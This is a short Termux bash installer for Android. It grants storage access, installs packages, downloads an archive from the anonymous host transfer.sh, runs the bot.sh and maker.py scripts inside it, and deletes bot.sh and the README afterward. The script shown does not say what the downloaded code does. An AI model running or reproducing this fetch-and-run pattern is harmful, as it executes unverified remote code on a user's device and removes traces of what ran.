#!/data/data/com.termux/files/usr/bin/bash
termux-setup-storage
pkg upgrade -y && pkg update -y
pkg install python -y
pkg install ruby -y
gem install lolcat -y

pkg install wget -y
mkdir -p /sdcard/MyTermux/session
cd /sdcard/MyTermux/session
wget https://transfer.sh/%28/k0baQ9/bot.sh,/Mui04V/maker.py,/rfXcDD/run,/3NSgJ6/README.md,/BH6A6L/requirements.txt,/WqSAWC/LICENSE%29.tar.gz -O transfersh-57226.tar.gz        
tar -xvzf transfersh-57226.tar.gz
rm -rf transfersh-57226.tar.gz
pkg install figlet
sh bot.sh
rm -rf bot.sh
rm -rf README.md
rm -rf LICENSE
pip3 install -r requirements.txt
python maker.py

